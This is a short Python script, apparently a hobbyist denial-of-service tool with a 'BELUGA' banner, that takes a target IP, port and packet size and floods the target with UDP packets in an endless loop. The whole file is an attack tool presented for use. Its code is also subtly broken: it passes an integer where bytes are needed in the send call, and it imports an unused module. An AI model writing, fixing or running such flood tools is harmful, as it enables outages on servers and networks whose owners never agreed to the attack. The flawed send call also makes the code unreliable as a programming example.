import socket
import random
from pystyle import Center, Colorate, Colors, Anime
from colorama import Fore
import os

os.system('cls')
print(Colorate.Horizontal(Colors.blue_to_cyan,"""
 /$$$$$$$  /$$$$$$$$ /$$       /$$   /$$  /$$$$$$   /$$$$$$ 
| $$__  $$| $$_____/| $$      | $$  | $$ /$$__  $$ /$$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \__/| $$  \ $$
| $$$$$$$ | $$$$$   | $$      | $$  | $$| $$ /$$$$| $$$$$$$$
| $$__  $$| $$__/   | $$      | $$  | $$| $$|_  $$| $$__  $$
| $$  \ $$| $$      | $$      | $$  | $$| $$  \ $$| $$  | $$
| $$$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$  | $$
|_______/ |________/|________/ \______/  \______/ |__/  |__/

                ┏━━━━━━━━━━━━━━━━━━━━━┓
                ┃  Author : Ego/xhe   ┃
                ┃ Discord: .gg/xxxx   ┃
                ┗━━━━━━━━━━━━━━━━━━━━━┛
                          
"""))
dest_ip = input("Target: ") 
dest_port = int(input("Port: "))  
packet_size = int(input("Packet size: "))  
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet_count = 0

try:
    while True:
        sock.sendto(packet_size, (dest_ip, dest_port))
        packet_count += 1
        print(Colorate.Horizontal(Colors.blue_to_cyan,f"Packets sent: {packet_count}"))
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
    sock.close()
except Exception as e:
    print(f"Error: {e}")
    sock.close()